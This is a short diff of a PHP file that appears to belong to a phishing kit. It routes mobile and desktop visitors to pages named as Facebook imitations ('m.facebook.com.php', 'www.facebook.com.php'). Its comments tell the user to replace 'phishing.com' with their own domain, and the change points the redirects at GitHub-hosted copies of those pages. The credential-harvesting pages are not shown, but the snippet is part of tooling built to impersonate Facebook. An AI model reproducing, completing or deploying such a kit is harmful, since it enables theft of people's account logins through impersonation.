@@ -33,13 +33,13 @@ else{
   {
     //if visitor of the page is mobile.
     //then show the mobile version.
-    header('Location: /m.facebook.com.php'); // just replace phishing.com with your domain.(mobile version)
+    header('Location: https://github.com/mahirlabibdihan/mahirlabibdihan.github.io/blob/master/m.facebook.com.php'); // just replace phishing.com with your domain.(mobile version)
   }
   else
   {
     //if visitor of the page is desktop.
     //then show the desktop version.
-    header("Location: /www.facebook.com.php"); // same here. (desktop version)
+    header("Location: https://github.com/mahirlabibdihan/mahirlabibdihan.github.io/blob/master/www.facebook.com.php"); // same here. (desktop version)
   }
 }
 ?>
